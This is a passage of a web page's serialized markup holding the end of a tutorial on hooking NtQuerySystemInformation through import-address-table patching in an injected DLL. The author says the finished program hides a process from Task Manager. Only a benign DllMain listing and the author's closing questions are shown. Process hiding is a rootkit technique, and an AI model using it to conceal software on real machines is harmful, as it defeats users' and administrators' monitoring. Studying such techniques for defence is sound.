47%)\"},\"children\":[15]}],[\"$\",\"span\",\"code-segement102\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement103\",{\"className\":\"token function\",\"style\":{},\"children\":[\"WriteLog\"]}],[\"$\",\"span\",\"code-segement104\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement105\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"L\"]}],[\"$\",\"span\",\"code-segement106\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\\\"Thread Detached!\\\"\"]}],[\"$\",\"span\",\"code-segement107\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement108\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement109\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--16\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[16]}],[\"$\",\"span\",\"code-segement111\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement112\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"break\"]}],[\"$\",\"span\",\"code-segement113\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement114\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--17\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[17]}],[\"$\",\"span\",\"code-segement116\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"  \"]}],[\"$\",\"span\",\"code-segement117\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"case\"]}],[\"$\",\"span\",\"code-segement118\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" DLL_PROCESS_DETACH\"]}],[\"$\",\"span\",\"code-segement119\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\":\"]}],[\"$\",\"span\",\"code-segement120\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--18\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[18]}],[\"$\",\"span\",\"code-segement122\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement123\",{\"className\":\"token function\",\"style\":{},\"children\":[\"WriteLog\"]}],[\"$\",\"span\",\"code-segement124\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"(\"]}],[\"$\",\"span\",\"code-segement125\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"L\"]}],[\"$\",\"span\",\"code-segement126\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(76, 21%, 52%)\"},\"children\":[\"\\\"Process Detached!\\\"\"]}],[\"$\",\"span\",\"code-segement127\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\")\"]}],[\"$\",\"span\",\"code-segement128\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement129\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--19\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[19]}],[\"$\",\"span\",\"code-segement131\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}],[\"$\",\"span\",\"code-segement132\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"break\"]}],[\"$\",\"span\",\"code-segement133\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement134\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--20\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[20]}],[\"$\",\"span\",\"code-segement136\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"  \"]}],[\"$\",\"span\",\"code-segement137\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"}\"]}],[\"$\",\"span\",\"code-segement138\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--21\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[21]}],[\"$\",\"span\",\"code-segement140\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"  \"]}],[\"$\",\"span\",\"code-segement141\",{\"className\":\"token\",\"style\":{\"color\":\"hsl(53, 89%, 79%)\"},\"children\":[\"return\"]}],[\"$\",\"span\",\"code-segement142\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" TRUE\"]}],[\"$\",\"span\",\"code-segement143\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\";\"]}],[\"$\",\"span\",\"code-segement144\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}],[\"$\",\"span\",\"line-number--22\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"3.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"hsl(0, 0%, 47%)\"},\"children\":[22]}],[\"$\",\"span\",\"code-segement146\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}],[\"$\",\"span\",\"code-segement147\",{\"className\":\"token\",\"style\":{\"Opacity\":\".7\"},\"children\":[\"}\"]}]]]}]}],[\"$\",\"div\",null,{\"className\":\"text-center text-md text-gray-500 mt-2 mb-2\",\"children\":\"Listing 5. DLL Main\"}]],[\"$\",\"p\",null,{\"children\":[\"For DLLs, instead of \",[\"$\",\"code\",null,{\"className\":\"code-snippet\",\"children\":\"int main()\"}],\", \",[\"$\",\"code\",null,{\"className\":\"code-snippet\",\"children\":\"DllMain\"}],\" is used. When DLL is attached in a process, it runs the \",[\"$\",\"code\",null,{\"className\":\"code-snippet\",\"children\":\"Patch\"}],\" function. You can try to build a function that will unpatch the IAT when DLL is detached in the process. If you want to learn more about building a DLL, you can start \",[\"$\",\"a\",null,{\"href\":\"https://docs.microsoft.com/en-us/windows/win32/dlls/dllmain\",\"children\":\"here\"}],\". That's it! I have built a program that will hide a process in the task manager! You change it so that the name is based on user-input. As of now, this has already sufficed me.  My Questions... From what I know, to call a function in Assembly Language, you must push all arguments first, then use CALL instruction. Why is the assembly code below does not do that? How does NtQuerySystemInformation know where are the arguments?  Also, on Listing 4, last 4 statements, why does this work? is kernel32.dll address the same for all processes?\"]}]]}]}],null,[\"$\",\"$La\",null,{\"children\":\"$Lb\"}]]}],{},null,false]},null,false]},null,false]},null,false],[\"$\",\"$1\",\"h\",{\"children\":[null,[\"$\",\"$1\",\"D9Yn5TWPJ1ybcT8KvvVDp\",{\"children\":[[\"$\",\"$Lc\",null,{\"children\":\"$Ld\"}],[\"$\",\"$Le\",null,{\"children\":\"$Lf\"}],null]}]]}],false]],\"m\":\"$undefined\",\"G\":[\"$10\",\"$undefined\"],\"s\":false,\"S\":true}\n"])</script><script>self.__next_f.push([1,"7:{}\n"])</script><script>self.__next_f.push([1,"f:[[\"$\",\"meta\",\"0\",{\"name\":\"viewport\",\"content\":\"width=device-width, initial-scale=1\"}]]\nd:[[\"$\",\"meta\",\"0\",{\"charSet\":\"utf-8\"}]]\n"])</script><script>self.__next_f.push([1,"b:null\n"])</script></body></html>